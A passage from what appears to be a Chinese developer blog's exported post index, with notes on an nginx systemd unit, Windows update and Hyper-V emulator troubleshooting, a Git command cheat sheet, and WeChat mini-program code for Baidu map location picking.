class="line">#指定了在systemd在执行完那些target之后再启动该服务</span><br><span class="line">After&#x3D;network.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">#定义Service的运行类型，一般是forking(后台运行)  </span><br><span class="line">Type&#x3D;forking</span><br><span class="line">PIDFile&#x3D;&#x2F;run&#x2F;nginx.pid</span><br><span class="line">#定义systemctl start|stop|reload *.service 的执行方法（具体命令需要写绝对路径）</span><br><span class="line">#启动前执行的命令</span><br><span class="line">ExecStartPre&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -t -q -g &#39;daemon on; master_process on;&#39;</span><br><span class="line">#启动时执行的命令</span><br><span class="line">ExecStart&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -g &#39;daemon on; master_process on;&#39;</span><br><span class="line">#重启时执行的命令</span><br><span class="line">ExecReload&#x3D;&#x2F;usr&#x2F;sbin&#x2F;nginx -g &#39;daemon on; master_process on;&#39; -s reload</span><br><span class="line">#停止时执行的命令</span><br><span class="line">ExecStop&#x3D;-&#x2F;sbin&#x2F;start-stop-daemon --quiet --stop --retry QUIT&#x2F;5 --pidfile &#x2F;run&#x2F;nginx.pid</span><br><span class="line">#停止服务时的等待的秒数,如果超过这个时间服务仍然没有停止,systemd会使用SIGKILL信号强行杀死服务的进程。 </span><br><span class="line">TimeoutStopSec&#x3D;5</span><br><span class="line">KillMode&#x3D;mixed</span><br><span class="line">#创建私有的内存临时空间</span><br><span class="line">PrivateTmp&#x3D;True</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">#多用户</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure>
<p>第二步</p>
<p>改权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 754 文件名</span><br></pre></td></tr></table></figure>
<p>第三步</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#重载系统服务：</span><br><span class="line">systemctl daemon-reload</span><br><span class="line">#一些命令</span><br><span class="line">#设置开机启动：</span><br><span class="line">systemctl enable *.service</span><br><span class="line">#启动服务：</span><br><span class="line">systemctl start *.service</span><br><span class="line">#停止服务：</span><br><span class="line">systemctl stop *.service</span><br><span class="line">#重启服务：</span><br><span class="line">systemctl reload *.service</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows专业版19013升级踩坑</title>
    <url>/2019/11/13/Note/window%E4%B8%93%E4%B8%9A%E7%89%8819013%E5%8D%87%E7%BA%A7%E8%B8%A9%E5%9D%91/</url>
    <content><![CDATA[<h1 id="Windows专业版19013升级踩坑"><a href="#Windows专业版19013升级踩坑" class="headerlink" title="Windows专业版19013升级踩坑"></a>Windows专业版19013升级踩坑</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>傍晚正在写着作业，突然跳出window更新，毕竟选了慢推送,心想没什么可怕的，可事情永远不会那么简单！！！</p>
<p>。。。。。。</p>
<a id="more"></a>

<h2 id="第一坑"><a href="#第一坑" class="headerlink" title="第一坑"></a>第一坑</h2><h3 id="问题"><a href="#问题" class="headerlink" title="问题:"></a>问题:</h3><p>开机就报错，Windows资源管理器报错Inter Optane(tm) Memory Pinning无法加载DLL”iaStorAfsService.dll”:找不到指定模块。(异常来自于HRESULT:0x8007007E)。</p>
<p><a href="https://yanmymickey.github.io/images/inter%E6%8A%A5%E9%94%99.jpg"><img src="https://yanmymickey.github.io/images/inter%E6%8A%A5%E9%94%99.jpg" alt="Inter Optane(tm) Memory Pinning"></a></p>
<p>右下角也不见了英特尔快速存储的程序图标</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法:"></a>解决办法:</h3><ol>
<li><p>查看相关服务，没有启动，发现有新程序打开等等需要读写内存的情况下，就会报错。然后由于是DELL笔记本，就去DELL官网查询相关驱动程序，下载了<a href="https://dl.dell.com/FOLDER05652684M/2/Intel-Rapid-Storage-Technology-Driver-and-Management_589C4_WIN_17.5.0.1017_A00.EXE?uid=3207dc64-199a-42f0-a5be-de600ce86f86&fn=Intel-Rapid-Storage-Technology-Driver-and-Management_589C4_WIN_17.5.0.1017_A00.EXE">Inter-Repaid-Storage-Technology-Driver-and-Managerment.exe</a>，运行并尝试修复，但是不起作用</p>
</li>
<li><p>搜索后发现，inter官网有更好的修复工具， <a href="https://downloadcenter.intel.com/downloads/eula/29007/Intel-Rapid-Storage-Technology-Intel-RST-User-Interface-and-Driver?httpDown=https://downloadmirror.intel.com/29007/eng/f6flpy-x64.zip&linkId=72858866">inter官网修复工具f6flpy.zip</a>，下载压缩包后解压，运行，然后会提示重启，重启后不再提示错误，问题解决</p>
<p><a href="https://yanmymickey.github.io/images/%E4%BF%AE%E5%A4%8D%E5%B7%A5%E5%85%B7.jpg"><img src="https://yanmymickey.github.io/images/%E4%BF%AE%E5%A4%8D%E5%B7%A5%E5%85%B7.jpg" alt="修复工具运行"></a></p>
</li>
</ol>
<h3 id="原因分析："><a href="#原因分析：" class="headerlink" title="原因分析："></a>原因分析：</h3><p>应该是该程序扩展丢失，造成程序和服务无法启动，修复工具将扩展装回，成功解决问题</p>
<h2 id="第二坑"><a href="#第二坑" class="headerlink" title="第二坑"></a>第二坑</h2><h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><p>某socks软件报错由于权限等愿意绑定本地端口10808失败，导致流量无法通过程序。</p>
<h3 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h3><ol>
<li>管理员权限运行powershell，输入nestat -ano|findstr ”10808“无显示，没有程序占用端口。</li>
<li>程序换成10800端口仍然不行，再次查看端口占用还是没有程序占用</li>
<li>打开控制面板-&gt;windows Defender 防火墙-&gt;高级设置-&gt;添加UDP和TCP的入站规则，重启电脑，没有解决。可能是设置了开机运行的缘故</li>
<li>把开机运行关闭，重复第三步，等待系统完全启动再运行该软件，发现无问题，貌似成功解决</li>
<li>事情没这么简单，中午再次开机运行，三四步都尝试均失效，于是尝试其他软件能否绑定这个端口</li>
<li>发现其他软件都无法绑定这个端口，并显示报错，10808端口为系统预留端口，I/O堆栈错误</li>
<li>遂切换思路,其他软件可以绑定1080端口，那不如就将该软件绑定1080端口，切换端口，成功</li>
</ol>
<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>本应该早一点进入第七步，但是顾及该软件还需要占用一个10809端口用于http，以为只切换10808端口不能解决问题，忘记曾经查看该软件源码http要用的10809为socks绑定的端口号+1，浪费些许时间。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Windows的更新：新功能不知道有什么，bug倒是立马出现/doge</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>夜神模拟器打开后Windows绿屏</title>
    <url>/2020/03/15/Note/%E5%A4%9C%E7%A5%9E%E5%AE%89%E5%8D%93%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%89%93%E5%BC%80Windows%E7%BB%BF%E5%B1%8Fbug/</url>
    <content><![CDATA[<h1 id="夜神模拟器打开后Windows绿屏"><a href="#夜神模拟器打开后Windows绿屏" class="headerlink" title="夜神模拟器打开后Windows绿屏"></a>夜神模拟器打开后Windows绿屏</h1><p>这货没有像vmware一样的异常处理，但是其模拟器运行环境是和vmware差不多的虚拟机,如果Windows开了wsl,将会和wsl的hype-V冲突,导致系统崩溃。</p>
<a id="more"></a>

<p>解决办法：</p>
<ul>
<li>通过命令关闭Hyper-V（控制面板关闭Hyper-V起不到决定性作用，要彻底关闭Hyper-V）</li>
<li>以管理员身份运行Windows Powershell (管理员)（Windows键+X）</li>
<li>运行下面命令并重启电脑：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#关闭hype-V</span><br><span class="line">bcdedit &#x2F;set hypervisorlaunchtype off</span><br></pre></td></tr></table></figure>
<p>再次打开模拟器就不会绿屏了。</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>Note</tag>
      </tags>
  </entry>
  <entry>
    <title>Git常用命令清单</title>
    <url>/2019/11/03/Note/%E5%B8%B8%E7%94%A8git%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95/</url>
    <content><![CDATA[<h1 id="Git常用命令清单"><a href="#Git常用命令清单" class="headerlink" title="Git常用命令清单"></a>Git常用命令清单</h1><h2 id="一、新建代码库"><a href="#一、新建代码库" class="headerlink" title="一、新建代码库"></a>一、新建代码库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在当前目录新建一个Git代码库</span><br><span class="line">git init</span><br><span class="line"></span><br><span class="line"># 新建一个目录，将其初始化为Git代码库</span><br><span class="line">git init [project-name]</span><br><span class="line"></span><br><span class="line"># 下载一个项目和它的整个代码历史</span><br><span class="line">git clone [url]</span><br></pre></td></tr></table></figure>
<a id="more"></a>

<h2 id="二、配置"><a href="#二、配置" class="headerlink" title="二、配置"></a>二、配置</h2><p>Git的设置文件为<code>.gitconfig</code>，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 显示当前的Git配置</span><br><span class="line">git config --list</span><br><span class="line"></span><br><span class="line"># 编辑Git配置文件</span><br><span class="line">git config -e [--global]</span><br><span class="line"></span><br><span class="line"># 设置提交代码时的用户信息</span><br><span class="line">git config [--global] user.name &quot;[name]&quot;</span><br><span class="line">git config [--global] user.email &quot;[email address]&quot;</span><br><span class="line"></span><br><span class="line">#为git配置全局代理</span><br><span class="line">git config --global http.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">git config --global https.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">git config --global https.proxy http:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">git config --global https.proxy https:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">#取消代理</span><br><span class="line">git config --global --unset http.proxy</span><br><span class="line">git config --global --unset https.proxy</span><br><span class="line"></span><br><span class="line">#只对github.com</span><br><span class="line">git config --global http.https:&#x2F;&#x2F;github.com.proxy socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">#取消代理</span><br><span class="line">git config --global --unset http.https:&#x2F;&#x2F;github.com.proxy</span><br><span class="line"></span><br><span class="line">#配置完代理后配置文件将出现下面类似字段</span><br><span class="line">[http]</span><br><span class="line">    proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">[https]</span><br><span class="line">    proxy&#x3D;socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br></pre></td></tr></table></figure>
<h2 id="三、增加-删除文件"><a href="#三、增加-删除文件" class="headerlink" title="三、增加/删除文件"></a>三、增加/删除文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 添加指定文件到暂存区</span><br><span class="line">git add [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># 添加指定目录到暂存区，包括子目录</span><br><span class="line">git add [dir]</span><br><span class="line"></span><br><span class="line"># 添加当前目录的所有文件到暂存区</span><br><span class="line">git add .</span><br><span class="line"></span><br><span class="line"># 添加每个变化前，都会要求确认</span><br><span class="line"># 对于同一个文件的多处变化，可以实现分次提交</span><br><span class="line">git add -p</span><br><span class="line"></span><br><span class="line"># 删除工作区文件，并且将这次删除放入暂存区</span><br><span class="line">git rm [file1] [file2] ...</span><br><span class="line"></span><br><span class="line"># 停止追踪指定文件，但该文件会保留在工作区</span><br><span class="line">git rm --cached [file]</span><br><span class="line"></span><br><span class="line"># 改名文件，并且将这个改名放入暂存区</span><br><span class="line">git mv [file-original] [file-renamed]</span><br></pre></td></tr></table></figure>
<h2 id="四、代码提交"><a href="#四、代码提交" class="headerlink" title="四、代码提交"></a>四、代码提交</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 提交暂存区到仓库区</span><br><span class="line">git commit -m [message]</span><br><span class="line"></span><br><span class="line"># 提交暂存区的指定文件到仓库区</span><br><span class="line">git commit [file1] [file2] ... -m [message]</span><br><span class="line"></span><br><span class="line"># 提交工作区自上次commit之后的变化，直接到仓库区</span><br><span class="line">git commit -a</span><br><span class="line"></span><br><span class="line"># 提交时显示所有diff信息</span><br><span class="line">git commit -v</span><br><span class="line"></span><br><span class="line"># 使用一次新的commit，替代上一次提交</span><br><span class="line"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br><span class="line">git commit --amend -m [message]</span><br><span class="line"></span><br><span class="line"># 重做上一次commit，并包括指定文件的新变化</span><br><span class="line">git commit --amend [file1] [file2] ...</span><br></pre></td></tr></table></figure>
<h2 id="五、分支"><a href="#五、分支" class="headerlink" title="五、分支"></a>五、分支</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 列出所有本地分支</span><br><span class="line">git branch</span><br><span class="line"></span><br><span class="line"># 列出所有远程分支</span><br><span class="line">git branch -r</span><br><span class="line"></span><br><span class="line"># 列出所有本地分支和远程分支</span><br><span class="line">git branch -a</span><br><span class="line"></span><br><span class="line"># 新建一个分支，但依然停留在当前分支</span><br><span class="line">git branch [branch-name]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，并切换到该分支</span><br><span class="line">git checkout -b [branch]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向指定commit</span><br><span class="line">git branch [branch] [commit]</span><br><span class="line"></span><br><span class="line"># 新建一个分支，与指定的远程分支建立追踪关系</span><br><span class="line">git branch --track [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 切换到指定分支，并更新工作区</span><br><span class="line">git checkout [branch-name]</span><br><span class="line"></span><br><span class="line"># 切换到上一个分支</span><br><span class="line">git checkout -</span><br><span class="line"></span><br><span class="line"># 建立追踪关系，在现有分支与指定的远程分支之间</span><br><span class="line">git branch --set-upstream [branch] [remote-branch]</span><br><span class="line"></span><br><span class="line"># 合并指定分支到当前分支</span><br><span class="line">git merge [branch]</span><br><span class="line"></span><br><span class="line"># 选择一个commit，合并进当前分支</span><br><span class="line">git cherry-pick [commit]</span><br><span class="line"></span><br><span class="line"># 删除分支</span><br><span class="line">git branch -d [branch-name]</span><br><span class="line"></span><br><span class="line"># 删除远程分支</span><br><span class="line">git push origin --delete [branch-name]</span><br><span class="line">git branch -dr [remote&#x2F;branch]</span><br></pre></td></tr></table></figure>
<h2 id="六、标签"><a href="#六、标签" class="headerlink" title="六、标签"></a>六、标签</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 列出所有tag</span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"># 新建一个tag在当前commit</span><br><span class="line">git tag [tag]</span><br><span class="line"></span><br><span class="line"># 新建一个tag在指定commit</span><br><span class="line">git tag [tag] [commit]</span><br><span class="line"></span><br><span class="line"># 删除本地tag</span><br><span class="line">git tag -d [tag]</span><br><span class="line"></span><br><span class="line"># 删除远程tag</span><br><span class="line">git push origin :refs&#x2F;tags&#x2F;[tagName]</span><br><span class="line"></span><br><span class="line"># 查看tag信息</span><br><span class="line">git show [tag]</span><br><span class="line"></span><br><span class="line"># 提交指定tag</span><br><span class="line">git push [remote] [tag]</span><br><span class="line"></span><br><span class="line"># 提交所有tag</span><br><span class="line">git push [remote] --tags</span><br><span class="line"></span><br><span class="line"># 新建一个分支，指向某个tag</span><br><span class="line">git checkout -b [branch] [tag]</span><br></pre></td></tr></table></figure>
<h2 id="七、查看信息"><a href="#七、查看信息" class="headerlink" title="七、查看信息"></a>七、查看信息</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 显示有变更的文件</span><br><span class="line">git status</span><br><span class="line"></span><br><span class="line"># 显示当前分支的版本历史</span><br><span class="line">git log</span><br><span class="line"></span><br><span class="line"># 显示commit历史，以及每次commit发生变更的文件</span><br><span class="line">git log --stat</span><br><span class="line"></span><br><span class="line"># 搜索提交历史，根据关键词</span><br><span class="line">git log -S [keyword]</span><br><span class="line"></span><br><span class="line"># 显示某个commit之后的所有变动，每个commit占据一行</span><br><span class="line">git log [tag] HEAD --pretty&#x3D;format:%s</span><br><span class="line"></span><br><span class="line"># 显示某个commit之后的所有变动，其&quot;提交说明&quot;必须符合搜索条件</span><br><span class="line">git log [tag] HEAD --grep feature</span><br><span class="line"></span><br><span class="line"># 显示某个文件的版本历史，包括文件改名</span><br><span class="line">git log --follow [file]</span><br><span class="line">git whatchanged [file]</span><br><span class="line"></span><br><span class="line"># 显示指定文件相关的每一次diff</span><br><span class="line">git log -p [file]</span><br><span class="line"></span><br><span class="line"># 显示过去5次提交</span><br><span class="line">git log -5 --pretty --oneline</span><br><span class="line"></span><br><span class="line"># 显示所有提交过的用户，按提交次数排序</span><br><span class="line">git shortlog -sn</span><br><span class="line"></span><br><span class="line"># 显示指定文件是什么人在什么时间修改过</span><br><span class="line">git blame [file]</span><br><span class="line"></span><br><span class="line"># 显示暂存区和工作区的差异</span><br><span class="line">git diff</span><br><span class="line"></span><br><span class="line"># 显示暂存区和上一个commit的差异</span><br><span class="line">git diff --cached [file]</span><br><span class="line"></span><br><span class="line"># 显示工作区与当前分支最新commit之间的差异</span><br><span class="line">git diff HEAD</span><br><span class="line"></span><br><span class="line"># 显示两次提交之间的差异</span><br><span class="line">git diff [first-branch]...[second-branch]</span><br><span class="line"></span><br><span class="line"># 显示今天你写了多少行代码</span><br><span class="line">git diff --shortstat &quot;@&#123;0 day ago&#125;&quot;</span><br><span class="line"></span><br><span class="line"># 显示某次提交的元数据和内容变化</span><br><span class="line">git show [commit]</span><br><span class="line"></span><br><span class="line"># 显示某次提交发生变化的文件</span><br><span class="line">git show --name-only [commit]</span><br><span class="line"></span><br><span class="line"># 显示某次提交时，某个文件的内容</span><br><span class="line">git show [commit]:[filename]</span><br><span class="line"></span><br><span class="line"># 显示当前分支的最近几次提交</span><br><span class="line">git reflog</span><br></pre></td></tr></table></figure>
<h2 id="八、远程同步"><a href="#八、远程同步" class="headerlink" title="八、远程同步"></a>八、远程同步</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 下载远程仓库的所有变动</span><br><span class="line">git fetch [remote]</span><br><span class="line"></span><br><span class="line"># 显示所有远程仓库</span><br><span class="line">git remote -v</span><br><span class="line"></span><br><span class="line"># 显示某个远程仓库的信息</span><br><span class="line">git remote show [remote]</span><br><span class="line"></span><br><span class="line"># 增加一个新的远程仓库，并命名</span><br><span class="line">git remote add [shortname] [url]</span><br><span class="line"></span><br><span class="line"># 取回远程仓库的变化，并与本地分支合并</span><br><span class="line">git pull [remote] [branch]</span><br><span class="line"></span><br><span class="line"># 上传本地指定分支到远程仓库</span><br><span class="line">git push [remote] [branch]</span><br><span class="line"></span><br><span class="line"># 强行推送当前分支到远程仓库，即使有冲突</span><br><span class="line">git push [remote] --force</span><br><span class="line"></span><br><span class="line"># 推送所有分支到远程仓库</span><br><span class="line">git push [remote] --all</span><br></pre></td></tr></table></figure>
<h2 id="九、撤销"><a href="#九、撤销" class="headerlink" title="九、撤销"></a>九、撤销</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 恢复暂存区的指定文件到工作区</span><br><span class="line">git checkout [file]</span><br><span class="line"></span><br><span class="line"># 恢复某个commit的指定文件到暂存区和工作区</span><br><span class="line">git checkout [commit] [file]</span><br><span class="line"></span><br><span class="line"># 恢复暂存区的所有文件到工作区</span><br><span class="line">git checkout .</span><br><span class="line"></span><br><span class="line"># 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变</span><br><span class="line">git reset [file]</span><br><span class="line"></span><br><span class="line"># 重置暂存区与工作区，与上一次commit保持一致</span><br><span class="line">git reset --hard</span><br><span class="line"></span><br><span class="line"># 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变</span><br><span class="line">git reset [commit]</span><br><span class="line"></span><br><span class="line"># 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致</span><br><span class="line">git reset --hard [commit]</span><br><span class="line"></span><br><span class="line"># 重置当前HEAD为指定commit，但保持暂存区和工作区不变</span><br><span class="line">git reset --keep [commit]</span><br><span class="line"></span><br><span class="line"># 新建一个commit，用来撤销指定commit</span><br><span class="line"># 后者的所有变化都将被前者抵消，并且应用到当前分支</span><br><span class="line">git revert [commit]</span><br><span class="line"></span><br><span class="line"># 暂时将未提交的变化移除，稍后再移入</span><br><span class="line">git stash</span><br><span class="line">git stash pop</span><br></pre></td></tr></table></figure>
<h2 id="十、其他"><a href="#十、其他" class="headerlink" title="十、其他"></a>十、其他</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 生成一个可供发布的压缩包</span><br><span class="line">git archive</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Note</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>微信小程序百度地图API移动选点</title>
    <url>/2020/11/05/Note/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E7%99%BE%E5%BA%A6%E5%9C%B0%E5%9B%BEapi%E7%A7%BB%E5%8A%A8%E9%80%89%E7%82%B9/</url>
    <content><![CDATA[<h1 id="微信小程序百度地图API移动选点"><a href="#微信小程序百度地图API移动选点" class="headerlink" title="微信小程序百度地图API移动选点"></a>微信小程序百度地图API移动选点</h1><p>因为业务需要使用百度地图API，参考一位大佬编写腾讯API的思路和方法，改造成百度地图API移动选点。</p>
<a id="more"></a>

<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>wxml前端部分就不改了，用用大佬的。</p>
<p>微信地图API获取当前位置经纬度信息-&gt;百度地图API逆地址解析方法,获取当前位置名称,省市区等信息-&gt;setData</p>
<p>mapChange函数监听地图移动-&gt;设置一个定时器达到轮询的目的，设置isGet参数判断onLoad中的wx.getlocation是否执行完。-&gt;nearby_search以当前的地址名称为搜索关键字,带上经纬度进行POI检索获取附近地址列表</p>
<p><strong>注意：</strong>页面初始化时会因为scale改变触发一次mapChange函数，由于JS单线程的特性，页面初始化与page初始化时同时进行的，如果先执行wx.getlocation那没有问题，执行完给经纬度赋值了，mapChange可以正常执行，如果mapChange先执行，那么此时经纬度没有初始值为空，mapChange返回的经纬度信息也为空，导致获取附近地址信息也为空。也可以使用getLocation中也执行一次获取附近地址信息的函数，但是这样会多调用一次API，调用API还是挺耗时。</p>
<p>getsuggest根据用户在输入框输入的关键字进行POI热词检索，搜索当前城市的热词列表。</p>
<p>这三个是主要功能，其他的关于选择省市区三级联动的部分，由于百度地图API没有提供完整的省市区县列表（可能有是我没找到），我也懒得封装了，就阉割掉了。</p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>贴一下关键的JS部分的代码，详细代码查看Github，记得在app.js填写的你的百度地图调用密匙ak</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import bmap from &#39;..&#x2F;..&#x2F;utils&#x2F;bmap-wx&#39;;</span><br><span class="line">import &#39;..&#x2F;..&#x2F;utils&#x2F;util&#39;</span><br><span class="line">let app &#x3D; getApp();</span><br><span class="line">let BMap &#x3D; new bmap.BMapWX(&#123;</span><br><span class="line">  ak: app.globalData.ak,</span><br><span class="line">&#125;);</span><br><span class="line">Page(&#123;</span><br><span class="line">  data: &#123;</span><br><span class="line">    addListShow: false,</span><br><span class="line">    addressName: &#39;&#39;,</span><br><span class="line">    currentRegion: &#123;</span><br><span class="line">      province: &#39;选择城市&#39;,</span><br><span class="line">      city: &#39;选择城市&#39;,</span><br><span class="line">      district: &#39;选择城市&#39;,</span><br><span class="line">    &#125;,</span><br><span class="line">    isGet: false,</span><br><span class="line">    latitude: &#39;&#39;,</span><br><span class="line">    longitude: &#39;&#39;,</span><br><span class="line">    centerData: &#123;&#125;,</span><br><span class="line">    nearList: [],</span><br><span class="line">    selectedId: 0,</span><br><span class="line">  &#125;,</span><br><span class="line">  onLoad: function () &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    let fail &#x3D; function (data) &#123;</span><br><span class="line">      console.log(data)</span><br><span class="line">    &#125;;</span><br><span class="line">    let success &#x3D; function (data) &#123;</span><br><span class="line">      &#x2F;&#x2F; console.log(data);</span><br><span class="line">      let wxMarkerData &#x3D; data.wxMarkerData;</span><br><span class="line">      that.setData(&#123;</span><br><span class="line">        isGet: true,</span><br><span class="line">        addressName: wxMarkerData[0].address,</span><br><span class="line">        currentRegion: data.originalData.result.addressComponent,</span><br><span class="line">        centerData: wxMarkerData,</span><br><span class="line">        latitude: wxMarkerData[0].latitude,</span><br><span class="line">        longitude: wxMarkerData[0].longitude</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    that.mapCtx &#x3D; wx.createMapContext(&#39;myMap&#39;)</span><br><span class="line">    &#x2F;&#x2F;微信API定位,获取当前位置经纬度</span><br><span class="line">    wx.getLocation(&#123;</span><br><span class="line">      type: &#39;wgs84&#39;,</span><br><span class="line">      success(res) &#123;</span><br><span class="line">        &#x2F;&#x2F;console.log(res)</span><br><span class="line">        BMap.regeocoding(&#123;</span><br><span class="line">          location: res.latitude + &#39;,&#39; + res.longitude,</span><br><span class="line">          fail: fail,</span><br><span class="line">          success: success,</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;,</span><br><span class="line">      fail(err) &#123;</span><br><span class="line">        &#x2F;&#x2F;console.log(err)</span><br><span class="line">        wx.hideLoading(&#123;&#125;);</span><br><span class="line">        wx.showToast(&#123;</span><br><span class="line">          title: &#39;定位失败&#39;,</span><br><span class="line">          icon: &#39;none&#39;,</span><br><span class="line">          duration: 1500</span><br><span class="line">        &#125;)</span><br><span class="line">        setTimeout(function () &#123;</span><br><span class="line">          wx.navigateBack(&#123;</span><br><span class="line">            delta: 1</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;, 1500)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;,</span><br><span class="line">  onReady: function () &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;监听拖动地图，拖动结束根据中心点更新页面</span><br><span class="line">  mapChange: function (e) &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    let fail &#x3D; function (data) &#123;</span><br><span class="line">      console.log(data)</span><br><span class="line">    &#125;;</span><br><span class="line">    let success &#x3D; function (data) &#123;</span><br><span class="line">      let wxMarkerData &#x3D; data.wxMarkerData[0];</span><br><span class="line">      &#x2F;&#x2F; console.log(wxMarkerData);</span><br><span class="line">      that.setData(&#123;</span><br><span class="line">        addressName: wxMarkerData.address,</span><br><span class="line">        currentRegion: data.originalData.result.addressComponent,</span><br><span class="line">      &#125;);</span><br><span class="line">      let location &#x3D; wxMarkerData.latitude + &#39;,&#39; + wxMarkerData.longitude;</span><br><span class="line">      that.nearby_search(wxMarkerData.address, location);</span><br><span class="line">    &#125;;</span><br><span class="line">    &#x2F;&#x2F;&amp;&amp; (e.causedBy &#x3D;&#x3D; &#39;scale&#39; || e.causedBy &#x3D;&#x3D; &#39;drag&#39;)</span><br><span class="line">    if (e.type &#x3D;&#x3D; &#39;end&#39; &amp;&amp; (e.causedBy &#x3D;&#x3D; &#39;scale&#39; || e.causedBy &#x3D;&#x3D; &#39;drag&#39;)) &#123;</span><br><span class="line">      &#x2F;*用一个轮询判断getlocation是否执行完,</span><br><span class="line">        保证定位完再执行mapchange,</span><br><span class="line">        主要是解决map组件初始化时会因为scale改变触发一次当前函数 </span><br><span class="line">      *&#x2F;</span><br><span class="line">      let i &#x3D; setInterval(function () &#123;</span><br><span class="line">        let &#123;</span><br><span class="line">          isGet</span><br><span class="line">        &#125; &#x3D; that.data;</span><br><span class="line">        if (isGet) &#123;</span><br><span class="line">          clearInterval(i);</span><br><span class="line">          &#x2F;&#x2F;先调用微信组件获取地图中心点位置经纬度</span><br><span class="line">          that.mapCtx.getCenterLocation(&#123;</span><br><span class="line">            success: function (res) &#123;</span><br><span class="line">              &#x2F;&#x2F; console.log(res)</span><br><span class="line">              that.setData(&#123;</span><br><span class="line">                nearList: [],</span><br><span class="line">                latitude: res.latitude,</span><br><span class="line">                longitude: res.longitude,</span><br><span class="line">              &#125;);</span><br><span class="line">              &#x2F;&#x2F;百度逆地址解析,将经纬度转换为地址信息</span><br><span class="line">              BMap.regeocoding(&#123;</span><br><span class="line">                location: res.latitude + &#39;,&#39; + res.longitude,</span><br><span class="line">                fail: fail,</span><br><span class="line">                success: success,</span><br><span class="line">              &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, 500)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F;重新定位</span><br><span class="line">  reload: function () &#123;</span><br><span class="line">    this.onLoad();</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  onShow: function () &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  &#x2F;&#x2F; 根据关键词搜索附近位置</span><br><span class="line">  nearby_search: function (addressName, location) &#123;</span><br><span class="line">    let that &#x3D; this;</span><br><span class="line">    &#x2F;*发起POI检索请求,搜索当前位置附近地址信息</span><br><span class="line">      如果不知道参数可以通过ctrl+鼠标左键进入类内部查看方法 </span><br><span class="line">    *&#x2F;</span><br><span class="line">    BMap.search(&#123;</span><br><span class="line">      &quot;query&quot;: addressName || &#39;房地产&#39;,</span><br><span class="line">      location: location,</span><br><span class="line">      page_size: 20,</span><br><span class="line">      page_index: 1,</span><br><span class="line">      success: function (res) 